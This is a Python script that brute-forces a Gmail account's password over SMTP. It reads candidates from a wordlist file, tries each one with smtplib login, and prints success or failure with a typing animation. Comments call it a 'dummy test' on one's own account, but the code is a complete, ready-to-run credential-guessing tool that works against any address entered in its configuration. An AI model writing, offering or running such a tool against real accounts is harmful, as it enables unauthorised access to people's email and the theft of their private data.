#!/usr/bin/env python3
import smtplib
import time

# Animation function (optional, cosmetic)
def animate(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.01)
    print()

# SMTP setup function
def start_smtp():
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    return server

# Dummy test: try passwords on your own account
def test_passwords(account, passlist):
    server = start_smtp()
    try:
        with open(passlist, 'r') as f:
            for password in f:
                password = password.strip()
                try:
                    server.login(account, password)
                    animate(f"[✅ SUCCESS] Password found: {password}")
                    break
                except smtplib.SMTPAuthenticationError:
                    animate(f"[❌ FAIL] Wrong password: {password}")
                except Exception as e:
                    animate(f"[⚠️ ERROR] {e}")
    except FileNotFoundError:
        print(f"[❌ ERROR] Password file '{passlist}' not found.")
    finally:
        server.quit()

# ===========================
# Configuration
# ===========================
dummy_account = "your_dummy_account@gmail.com"
password_file = "passwords.txt"  # Your local list of passwords

# Run the test
test_passwords(dummy_account, password_file)
